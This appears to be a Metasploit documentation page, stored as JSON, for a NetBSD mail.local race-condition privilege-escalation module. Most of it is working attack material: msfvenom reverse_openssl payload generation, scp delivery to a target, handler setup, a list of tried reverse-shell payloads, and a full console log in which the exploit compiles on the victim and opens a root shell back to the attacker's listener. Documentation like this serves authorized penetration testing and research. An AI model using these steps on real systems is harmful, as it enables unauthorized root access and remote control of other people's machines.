{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/local/netbsd_mail_local","result":{"data":{"moduleMetadataJson":{"id":"f9712c83-4c6a-5fe4-b926-2fac005cf2cd","name":"NetBSD mail.local Privilege Escalation","fullname":"exploit/unix/local/netbsd_mail_local","description":"This module attempts to exploit a race condition in mail.local with SUID bit set on:\n            NetBSD 7.0 - 7.0.1 (verified on 7.0.1)\n        NetBSD 6.1 - 6.1.5\n        NetBSD 6.0 - 6.0.6\n          Successful exploitation relies on a crontab job with root privilege, which may take up to 10min to execute.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/local/netbsd_mail_local","documentationSlug":"/modules/documentation/exploit/unix/local/netbsd_mail_local"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  NetBSD 7.0.1 is available from the <a href=\"http://cdn.netbsd.org/pub/NetBSD/NetBSD-7.0.1/images/NetBSD-7.0.1-amd64.iso\">official</a> site, or on an <a href=\"https://github.com/h00die/MSF-Testing-Scripts/blob/master/NetBSD-7.0.1-amd64.iso\">unofficial git</a> </p>\n<h2 id=\"issues\" style=\"position:relative;\"><a href=\"#issues\" aria-label=\"issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Issues</h2>\n<p>Getting an initial shell that can write files correctly was difficult.  The best I found was reverse_openssl.</p>\n<p>Payloads that didn't work:</p>\n<ul>\n<li>\n<p>cmd/unix/reverse - connected back, but couldn't write file.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP double handler on 172.16.152.1:4444 \n[*] Writing Payload to /tmp/zrWqhXpL\n[*] Max line length is 131073\n[*] /usr/bin/printf &#39;\\0\\377\\376\\101\\102\\103\\104\\177\\45\\45\\15\\12&#39; Failed: &quot;\\xFF\\xF4\\xFF\\xFD\\x06\\xFF\\xFF\\xFEABCD\\x7F%%\\r\\x00\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] printf &#39;\\0\\377\\376\\101\\102\\103\\104\\177\\45\\45\\15\\12&#39; Failed: &quot;\\xFF\\xF4\\xFF\\xFD\\x06\\xFF\\xFF\\xFEABCD\\x7F%%\\r\\x00\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] /usr/bin/printf %b &#39;\\0\\377\\376\\101\\102\\103\\104\\177\\45\\45\\15\\12&#39; Failed: &quot;\\xFF\\xF4\\xFF\\xFD\\x06\\xFF\\xFF\\xFEABCD\\x7F%%\\r\\x00\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] printf %b &#39;\\0\\377\\376\\101\\102\\103\\104\\177\\45\\45\\15\\12&#39; Failed: &quot;\\xFF\\xF4\\xFF\\xFD\\x06\\xFF\\xFF\\xFEABCD\\x7F%%\\r\\x00\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] perl -e &#39;print(&quot;\\0\\377\\376\\101\\102\\103\\104\\177\\45\\45\\15\\12&quot;)&#39; Failed: &quot;perl: not found\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] gawk &#39;BEGIN {ORS=&quot;&quot;;print &quot;\\x00\\xff\\xfe\\x41\\x42\\x43\\x44\\x7f\\x25\\x25\\x0d\\x0a&quot;}&#39; &lt;/dev/null Failed: &quot;gawk: not found\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] echo &#39;00fffe414243447f25250d0a&#39;|xxd -p -r Failed: &quot;xxd: not found\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[*] echo -ne &#39;\\x00\\xff\\xfe\\x41\\x42\\x43\\x44\\x7f\\x25\\x25\\x0d\\x0a&#39; Failed: &quot;-ne \\\\x00\\\\xff\\\\xfe\\\\x41\\\\x42\\\\x43\\\\x44\\\\x7f\\\\x25\\\\x25\\\\x0d\\\\x0a\\r\\n&quot; != &quot;\\x00\\xFF\\xFEABCD\\x7F%%\\r\\n&quot;\n[-] Exploit failed: RuntimeError Can&#39;t find command on the victim for writing binary data\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>cmd/unix/reverse_awk - <code class=\"language-text\">awk: syntax error at source line 1</code></li>\n<li>cmd/unix/reverse_bash - <code class=\"language-text\">./bsd.payload: 1: Syntax error: Bad fd number</code></li>\n<li>cmd/unix/reverse<em>bash</em>telnet_ssl - <code class=\"language-text\">$ telnet: unknown option -- z</code></li>\n<li>cmd/unix/reverse<em>ssl</em>double_telnet - <code class=\"language-text\">$ telnet: unknown option -- z</code></li>\n<li>cmd/unix/reverse_lua - <code class=\"language-text\">lua: (command line):1: module &#39;socket&#39; not found</code></li>\n<li>netcat, node, perl, php, python, php, ruby, zsh - all not installed by default</li>\n<li>bsd/* didn't seem to work either, maybe its for freebsd?</li>\n</ul>\n<p>Payloads that did work:</p>\n<ul>\n<li>cmd/unix/reverse_openssl</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>\n<p>Get an initial shell</p>\n<ol>\n<li>\n<p>Create working shell, scp it over</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p cmd/unix/reverse_openssl lhost=172.16.152.1 -f raw -o /tmp/bsd.payload\nscp /tmp/bsd.payload user@172.16.152.128:/tmp/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Setup msf to handle</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/handler\nset payload cmd/unix/reverse_openssl\nset lhost 172.16.152.1\nexploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Run the shell from NetBSD</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ cd /tmp\n$ ls\nbsd.payload\n$ chmod +x bsd.payload \n$ ./bsd.payload \n$ WARNING: can&#39;t open config file: /etc/openssl/openssl.cnf\ndepth=0 CN = vgekg\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = vgekg\nverify return:1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Receive the shell and background it</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse double SSL handler on 172.16.152.1:4444 \n[*] Starting the payload handler...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo NwNHAEiJioYIvn4M;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;NwNHAEiJioYIvn4M\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (172.16.152.1:4444 -&gt; 172.16.152.128:65534) at 2016-08-25 19:58:39 -0400\n^Z\nBackground session 1? [y/N]  y</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n</li>\n<li>Do: <code class=\"language-text\">use exploit/unix/local/netbsd_mail_local</code></li>\n<li>Do: <code class=\"language-text\">set payload cmd/unix/reverse_openssl</code></li>\n<li>Do: <code class=\"language-text\">set lhost 172.16.152.1</code></li>\n<li>Do: <code class=\"language-text\">set verbose true</code></li>\n<li>Do: <code class=\"language-text\">set session 1</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>You should get a <em>root</em> shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>ATRUNPATH</strong>\nFile location of atrun, defaults to <code class=\"language-text\">/usr/libexec/atrun</code></p>\n<p>  <strong>MAILDIR</strong>\nLocation of mail folder, defaults to <code class=\"language-text\">/var/mail</code></p>\n<p>  <strong>WritableDir</strong>\nLocation of a writable directory for our payload, defaults to <code class=\"language-text\">/tmp</code></p>\n<p>  <strong>ListenerTimeout</strong>\nSince this exploit utilized a cron which has a 10min timer, the listener timeout needs to be 10min + padding.  Defaults to <code class=\"language-text\">603</code> seconds (10min, 3sec)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  Here is a run against a virgin install of <code class=\"language-text\">NetBSD  7.0.1 NetBSD 7.0.1 (GENERIC.201605221355Z) amd64</code> (from the unofficial link at the top)</p>\n<p>  In this example, I got lucky and only had to wait ~1min for the cron to hit, which is every 10min by default</p>\n<ol>\n<li>\n<p>Get an initial shell</p>\n<ol>\n<li>\n<p>Create working shell, scp it over</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">./msfvenom -p cmd/unix/reverse_openssl lhost=172.16.152.1 -f raw -o /tmp/bsd.payload\nscp /tmp/bsd.payload user@172.16.152.128:/tmp/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Setup msf to handle</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/multi/handler\nset payload cmd/unix/reverse_openssl\nset lhost 172.16.152.1\nexploit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Run the shell from NetBSD</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ cd /tmp\n$ ls\nbsd.payload\n$ chmod +x bsd.payload \n$ ./bsd.payload \n$ WARNING: can&#39;t open config file: /etc/openssl/openssl.cnf\ndepth=0 CN = vgekg\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = vgekg\nverify return:1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Receive the shell and background it</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse double SSL handler on 172.16.152.1:4444 \n[*] Starting the payload handler...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo NwNHAEiJioYIvn4M;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;NwNHAEiJioYIvn4M\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 1 opened (172.16.152.1:4444 -&gt; 172.16.152.128:65534) at 2016-08-25 19:58:39 -0400\n^Z\nBackground session 1? [y/N]  y</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n</li>\n<li>\n<p>Run the exploit</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(netbsd_mail_local) &gt; set payload cmd/unix/reverse_openssl\npayload =&gt; cmd/unix/reverse_openssl\nmsf exploit(netbsd_mail_local) &gt; set lhost 172.16.152.1\nlhost =&gt; 172.16.152.1\nmsf exploit(netbsd_mail_local) &gt; set verbose true\nverbose =&gt; true\nmsf exploit(netbsd_mail_local) &gt; set session 1\nsession =&gt; 1\nmsf exploit(netbsd_mail_local) &gt; exploit\n[*] Started reverse double SSL handler on 172.16.152.1:4444 \n[*] Writing Payload to /tmp/pjDkvmGg\n[*] Max line length is 131073\n[*] Writing 176 bytes in 1 chunks of 618 bytes (octal-encoded), using printf\n[*] Writing exploit to /tmp/GHIKGOWX.c\n[*] Max line length is 131073\n[*] Writing 4898 bytes in 1 chunks of 17162 bytes (octal-encoded), using printf\n[*] Compiling /tmp/GHIKGOWX.c via gcc\n[*] Starting the payload handler...\n[*] Executing at 2016-08-25 19:59:04 -0400.  May take up to 10min for callback\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo X6C4UIDx4zmwM0DJ;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket A\n[*] A: &quot;X6C4UIDx4zmwM0DJ\\n&quot;\n[*] Matching...\n[*] B is input...\n[*] Command shell session 2 opened (172.16.152.1:4444 -&gt; 172.16.152.128:65532) at 2016-08-25 20:00:02 -0400\n[*] 2016-08-25 20:00:02 -0400\n[*] Remember to run: chown root:wheel /usr/libexec/atrun\n[+] Deleted /tmp/pjDkvmGg\n[!] This exploit may require manual cleanup of &#39;/tmp/pjDkvmGg&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/GHIKGOWX&#39; on the target\n[!] This exploit may require manual cleanup of &#39;/tmp/GHIKGOWX.out&#39; on the target\n1633029467\nTkBWZEPqsRvYvmwNaTcjImhcSzZHOAtY\ntrue\nJUqfyioWthnpvyxRJAZosSGQjnLHqPUB\nsHXbQbHqFIbnZGoFWlZoppGprWyKwFCr\nnDpSrEmQhDuVSxIpILWCOABbMOIAWUTx\nwhoami\nroot</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>"}}},"pageContext":{"id":"f9712c83-4c6a-5fe4-b926-2fac005cf2cd"}}}